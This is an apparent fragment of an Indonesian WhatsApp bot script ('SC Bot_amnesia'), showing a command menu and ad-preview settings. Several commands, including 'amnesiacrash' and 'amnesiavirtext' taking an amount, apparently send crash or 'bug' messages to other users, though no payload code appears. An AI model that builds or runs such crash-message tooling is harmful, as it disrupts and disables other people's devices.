┣❏amnesia𝐯irtext [ jumlah ]
┣❏amnesia𝐯irtext1 [ jumlah ]
┣❏amnesia𝐯irtext2 [ jumlah ]
┣❏amnesia𝐯irtext3 [ jumlah ]
┣❏amnesiacrash [ jumlah ]
┣❏amnesiacrash1 [ jumlah ]
┣❏amnesiacrash2 [ jumlah ]
┣❏amnesiacrash3 [ jumlah ]
┣❏amnesiacrash4 [ jumlah ]
┣❏amnesiacrash5 [ jumlah ]
┣❏amnesiacrash6 [ jumlah ]
┣❏amnesiacrash7 [ jumlah ]
┣❏amnesialokas [ jumlah ]
┣❏amnesialokas2 [ jumlah ]
┣❏amnesiakangbug [ jumlah ]
┣❏amnesiakangbug1 [ jumlah ]
┣❏amnesiabar [ jumlah ]
┣❏amnesiaoke [ jumlah ]
┣❏amnesiaewe [ jumlah ]
┣❏amnesiangentod [ jumlah ]
┣❏amnesia1 [ jumlah ]
┣❏amnesia2 [ jumlah ]
┣❏amnesia3 [ jumlah ]
┣❏amnesia4 [ jumlah ]
...
┗━━⊱`,
contextInfo:{"externalAdReply": {"title": `SC Bot_amnesia`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
...
┣❏ngeselin
┗━━⊱[ © ★𝐀𝐦𝐧𝐞𝐬𝐢𝐚★]`,
contextInfo:{"externalAdReply": {"title": `SC © amnesia`,"body": `Selamat ${salam} kak ${pushname}`,
previewType: "PHOTO",
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
